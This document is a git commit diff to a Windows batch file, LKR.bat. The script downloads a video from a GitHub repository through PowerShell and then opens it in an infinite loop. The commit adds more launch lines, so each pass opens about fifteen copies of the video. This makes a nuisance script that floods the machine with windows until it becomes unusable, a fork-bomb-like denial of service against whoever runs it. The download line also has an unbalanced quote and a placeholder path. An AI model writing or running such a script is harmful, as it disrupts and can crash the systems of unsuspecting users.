28833dfadf66c9c522b1f66a364d9fe979ec8906
LKR-beta <gbu23224@gmail.com>
2024-10-09 08:33:49 +0900

    LKR.bat

--- LKR.bat
+++ LKR.bat
@@ -4,11 +4,40 @@ cls
 
 powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4','C:\your\asylum\Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4)"
 
+start max Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
+timeout /t 10
+
 :loop
 
 start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
 start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
 start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
 start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
 start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
+start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
+start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
+start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
+start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
+start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
+start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
+start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
+start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
+start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
+start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+
 goto loop
